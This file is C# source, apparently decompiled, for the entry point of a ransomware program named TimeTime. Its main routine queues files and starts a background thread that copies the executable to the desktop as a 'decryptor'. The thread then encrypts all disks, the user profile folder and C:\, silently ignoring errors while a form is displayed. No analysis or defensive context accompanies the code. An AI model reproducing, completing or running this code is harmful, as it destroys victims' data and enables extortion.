using System;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace TimeTime;

internal static class Program
{
	private static void DoStuff()
	{
		try
		{
			File.Copy(Application.get_ExecutablePath(), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\" + Settings.decryptor_file_name);
			Cryptor.EncryptDisks();
			Cryptor.TryEncryptFolder(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile));
			Cryptor.EncryptFolder("C:\\");
		}
		catch (Exception)
		{
		}
	}

	[STAThread]
	private static void Main()
	{
		FileManager.Init();
		string[] files = FileManager.GetFiles();
		foreach (string item in files)
		{
			Cryptor.encr_files.Add(item);
		}
		try
		{
			Thread thread = new Thread(DoStuff);
			thread.Start();
		}
		catch (Exception)
		{
			DoStuff();
		}
		Application.EnableVisualStyles();
		Application.SetCompatibleTextRenderingDefault(false);
		Application.Run((Form)(object)new Form1());
	}
}
